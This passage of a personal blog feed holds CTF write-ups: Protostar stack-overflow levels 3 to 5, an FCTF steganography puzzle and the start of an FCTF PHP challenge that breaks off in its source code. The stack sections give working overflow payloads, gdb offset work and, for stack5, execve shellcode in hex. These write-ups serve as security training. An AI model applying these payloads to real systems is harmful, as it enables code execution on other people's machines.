+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack3
+</span><span class='line'>Reading symbols from stack3...done.
+</span><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x08048424 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048425 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x08048427 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x0804842a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048540
+</span><span class='line'>   0x08048431 &lt;+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
+</span><span class='line'>   0x08048436 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048437 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>So <code>win</code> &rsquo;s address is <code>0x08048424</code>. Now, we will build a payload, which contains 64 &lsquo;A&rsquo; characters and <code>0x08048424</code> in Little Endiance.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "A" * 64 + "\x24\x84\x04\x08"' &gt; input3.b
+</span><span class='line'>➜  ./stack3 &lt; input3.b
+</span><span class='line'>calling function pointer, jumping to 0x08048424
+</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>STACK 4</h2>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack4.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>This piece of code is so brief. Same idea as Stack 3, we must change code flow to <code>win</code> function, however there is no <code>fb</code> for us overwrite.</p>
+
+<blockquote><p>It&rsquo;s time for EIP.</p></blockquote>
+
+<p>When disassembly main function, we have:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ disass main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x08048408 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048409 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
+</span><span class='line'>   0x0804840e &lt;+6&gt;:     sub    esp,0x50
+</span><span class='line'>   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
+</span><span class='line'>   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
+</span><span class='line'>   0x0804841d &lt;+21&gt;:    leave
+</span><span class='line'>   0x0804841e &lt;+22&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>After <code>leave</code> instructor in <code>*main+21</code>, the program will call the function which has address equal to <code>EIP register</code>&rsquo;s value. The easiest way to pass this level is overwrite EIP.</p>
+
+<p>First of all, we need <code>EIP</code> &rsquo;s offset. Try inject <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567</code></p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ r
+</span><span class='line'>Starting program: /root/protostar/bin/stack4
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>EAX: 0xffffda90 ('A' &lt;repeats 74 times&gt;, "1234567")
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0xf7fca5a0 --&gt; 0xfbad2288
+</span><span class='line'>EDX: 0xf7fcb87c --&gt; 0x0
+</span><span class='line'>ESI: 0x1
+</span><span class='line'>EDI: 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>EBP: 0x32314141 ('AA12')
+</span><span class='line'>ESP: 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>EIP: 0x36353433 ('3456')
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>Invalid $PC address: 0x36353433
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>0004| 0xffffdae4 --&gt; 0xffffdb74 --&gt; 0xffffdca3 ("/root/protostar/bin/stack4")
+</span><span class='line'>0008| 0xffffdae8 --&gt; 0xffffdb7c --&gt; 0xffffdcbe ("USER=root")
+</span><span class='line'>0012| 0xffffdaec --&gt; 0x0
+</span><span class='line'>0016| 0xffffdaf0 --&gt; 0x0
+</span><span class='line'>0020| 0xffffdaf4 --&gt; 0x0
+</span><span class='line'>0024| 0xffffdaf8 --&gt; 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>0028| 0xffffdafc --&gt; 0x8048218 --&gt; 0x675f5f00 ('')
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x36353433 in ?? ()</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>We have &lsquo;0x36353433&rsquo; (equal to <code>3456</code> in ascii).</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Next, we will find address of <code>win</code> function through the previous way.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x080483f4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
+</span><span class='line'>   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
+</span><span class='line'>   0x08048406 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048407 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>=> 0x080483f4</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
+</span><span class='line'>target_address = "\xf4\x83\x04\x08"
+</span><span class='line'>payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Compose input file and inject to program</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"' &gt; input4.b
+</span><span class='line'>➜  ./stack4 &lt; input4.b
+</span><span class='line'>code flow successfully changed
+</span><span class='line'>[1]    50114 segmentation fault (core dumped)  ./stack4 &lt; input4.b</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>STACK 5</h2>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack5.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>There is not <strong>win()</strong> function, just two line for initialization and read input. &ldquo;Have you ever forgetten copying some thing ?&rdquo;</p>
+
+<p>Don&rsquo;t worry, it is the great chance for us to make friend with shellcode.
+We should overwrite EIP (using technique from previous challenge) in order to redirect program execution to our shellcode, which also was injected to input data.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = flushdata + bufaddr + nopdata + shellcode</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Easily to recognize that</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flushdata = 'A' * 76</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p><strong>bufaddr</strong> points to shellcode&rsquo;s address in Stack. Using <strong>gdb</strong>, we have:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bufaddr = pack("&lt;I", 0xffffdbe0)</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p><strong>nopdata</strong> was used to avoid the different between the memory address inside gdb and outside.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nopdata = "\x90" * 66</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<blockquote><p>What is <strong>shellcode</strong> ? Where should we find <strong>shellcode</strong> ?</p></blockquote>
+
+<p>We can build our shellcode through using <strong>msfvenom</strong> in msf framework.</p>
+
+<p>This is shellcode i using:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Combine all of them together and <strong>dd</strong> whatever you want :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[FCTF White Steganography Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/07/fctf-white-steganography-writeup/"/>
+    <updated>2015-08-07T01:20:57+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/07/fctf-white-steganography-writeup</id>
+    <content type="html"><![CDATA[<p>In FCTF, there is a stegno challenge. It&rsquo;s quite simple, but, i had lost so this challenge took me about 40 mins.
+This is a reason for me to write about it today.</p>
+
+<p>I have a &ldquo;white&rdquo; picture:</p>
+
+<p><img src="http://i.imgur.com/2ukiJIf.png" alt="White" /></p>
+
+<p>When face a stegano challenge, the first thought in my mind is check metadata.</p>
+
+<p>I used to use <code>exiftool</code>.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  exiftool 2ukiJIf.png
+</span><span class='line'>ExifTool Version Number         : 9.46
+</span><span class='line'>File Name                       : 2ukiJIf.png
+</span><span class='line'>Directory                       : .
+</span><span class='line'>File Size                       : 1088 bytes
+</span><span class='line'>File Modification Date/Time     : 2015:08:06 22:13:30-04:00
+</span><span class='line'>File Access Date/Time           : 2015:08:06 22:16:43-04:00
+</span><span class='line'>File Inode Change Date/Time     : 2015:08:06 22:16:43-04:00
+</span><span class='line'>File Permissions                : rw-r--r--
+</span><span class='line'>File Type                       : PNG
+</span><span class='line'>MIME Type                       : image/png
+</span><span class='line'>Image Width                     : 300
+</span><span class='line'>Image Height                    : 150
+</span><span class='line'>Bit Depth                       : 8
+</span><span class='line'>Color Type                      : RGB
+</span><span class='line'>Compression                     : Deflate/Inflate
+</span><span class='line'>Filter                          : Adaptive
+</span><span class='line'>Interlace                       : Noninterlaced
+</span><span class='line'>SRGB Rendering                  : Perceptual
+</span><span class='line'>Gamma                           : 2.2
+</span><span class='line'>Pixels Per Unit X               : 3779
+</span><span class='line'>Pixels Per Unit Y               : 3779
+</span><span class='line'>Pixel Units                     : Meters
+</span><span class='line'>Image Size                      : 300x150</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Nothing to do more with exiftool.</p>
+
+<p>I try viewing the raw data as hex. Too complicated with a pure white image. Is something injected in that file ? or LSB implemented ?
+To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost</code> and <code>stegsolve</code> can be useful.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  binwalk 2ukiJIf.png
+</span><span class='line'>
+</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span><span class='line'>--------------------------------------------------------------------------------
+</span><span class='line'>0             0x0             PNG image, 300 x 150, 8-bit/color RGB, non-interlaced
+</span><span class='line'>91            0x5B            Zlib compressed data, compressed</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>I check zlib compressed data, but it is not what we need.
+Now is your time, <code>foremost</code> !</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  foremost -i 2ukiJIf.png
+</span><span class='line'>Processing: 2ukiJIf.png
+</span><span class='line'>|*|</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>I also spend ~20mins with StegSolve to ensure that file is not pure white.</p>
+
+<p>Anything i have ignored ?</p>
+
+<blockquote><p>Never give up</p></blockquote>
+
+<p>I write a piece of code to highlight the pixel which is not pure white (255, 255, 255)</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python2.7
+</span><span class='line'>
+</span><span class='line'>import cv2
+</span><span class='line'>import numpy as np
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>  img = cv2.imread('2ukiJIf.png', 0)  
+</span><span class='line'>  s = ''
+</span><span class='line'>  for x in range(150):
+</span><span class='line'>      for y in range(300):    
+</span><span class='line'>          if img[x][y] != 255:                            
+</span><span class='line'>              s += '+'
+</span><span class='line'>          else:
+</span><span class='line'>              s += ' '
+</span><span class='line'>      s += '\n'
+</span><span class='line'>  f = open("out.txt", "w")
+</span><span class='line'>  f.write(s)  </span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Luck me, after openning the out file, i get flag.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
+</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
+</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
+</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
+</span><span class='line'>                                                  ++   ++    ++   ++++   +++++           ++++     ++++     ++++            ++   ++++            ++ +++      ++++    +++++            ++++   ++ +++      ++++    ++    ++   +++++++ ++ +++                                                               
+</span><span class='line'>                                                  ++   ++    ++  ++   +   ++            ++   +   ++  ++   ++  ++           ++  ++   +           +++  ++    ++  ++    ++             ++  ++  +++  ++    ++  ++   ++    ++  ++   ++  +++  ++                                                              
+</span><span class='line'>                                                  ++   ++    ++  ++       ++            ++      ++   ++  ++   ++           ++  ++               ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++  +++      ++            +++     ++   ++  ++   ++           ++  +++              ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++   ++++    ++             ++++   +++++++  +++++++           ++   ++++            ++    ++  ++    ++   ++            +++++++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++     +++   ++               +++  ++       ++                ++     +++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++   +++++   ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++      ++   ++                ++  ++       ++                ++      ++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++  ++       ++    ++                                                             
+</span><span class='line'>                                                  ++    ++  +++  +   ++   ++            +   ++   ++   +   ++   +           ++  +   ++           ++    ++   ++  ++    ++             ++   +  ++    ++   ++  ++    ++  +++   ++++++  ++    ++                                                             
+</span><span class='line'>                                                  ++     +++ ++   ++++     +++           ++++     ++++     ++++            ++   ++++            ++    ++    ++++      +++            ++++   ++    ++    ++++      +++ ++  ++    ++ ++    ++                                                             
+</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
+</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
+</span><span class='line'>                                                +++                           +++++++++                          +++++++++            +++++++++                          +++++++++                                         ++++++                                                                       
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                          
+</span><span class='line'>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p></p>
+
+<p>Quite simple, right ? :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[FCTF Easy PHP Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/06/fctf-easy-php/"/>
+    <updated>2015-08-06T20:49:02+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/06/fctf-easy-php</id>
+    <content type="html"><![CDATA[<p>Last week, when feed my brain with CTF, i face a web challenge. Luckily, with the help from my friend, i solve it.
+This challenge may be easy, but with me, it is interesting and i study something. So, tonight, i spend my gaming time to explain about this.</p>
+
+<p>My English is terrible, however, i will try with my best.</p>
+
+<p>This challenge give us the url to the web page which have written by php. For personal reason, i can&rsquo;t show it here.</p>
+
+<p>Here we go,
+after viewing source, i discover the piece of backend code:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
+</span><span class='line'>
+</span><span class='line'>    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
+</span><span class='line'>    function crc32_string($v){return sprintf("%08x", crc32($v) & 0xffffffff);}
+</span><span class='line'>
+</span><span class='line'>    $value = (isset($_POST['value']) && is_string($_POST['value'])) ? $_POST['value'] : '';
+</span><span class='line'>
+</span><span class='line'>    $flag = ($value !== "" && $value !== "ecTmZcC" && crc32_string($value) == crc32_string('ecTmZcC')) ? 'CENSORED': 'bad value';
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;!DOCTYPE html&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>  &lt;head&gt;
+</span><span class='line'>    &lt;meta charset="utf-8"&gt;
+</span><span class='line'>    &lt;title&gt;For PHP Expert&lt;/title&gt;
+</span><span class='line'>  &lt;/head&gt;
+</span><span class='line'>  &lt;body&gt;
+</span><span class='line'>    &lt;p&gt;
+</span><span class='line'>       PHP is a magic language &lt;3. &lt;br&gt;Enter a good value and I'll give you flag ;)
+</span><span class='line'>    &lt;/p&gt;
+</span><span class='line'>    &lt;form method="POST"&gt;
+</span><span class='line'>      &lt;div&gt;Value: &lt;input type="text" name="value" value="&lt;?php echo h($value); ?&gt;"&gt;&lt;/div&gt;
+</span><span class='line'>      &lt;br&gt;
+</span><span class='line'>      &lt;div&gt;&lt;input type="submit" value="Submit"&gt;&lt;/div&gt;
+</span><span class='line'>    &lt;/form&gt;
+</span><span class='line'>    &lt;br&gt;
+</span><span class='line'>    &lt;?php echo $flag ?&gt;
+</span><span class='line'>  &lt;/body&gt;
+</span><span class='line'>  &lt;!-- magic.phps --&gt;
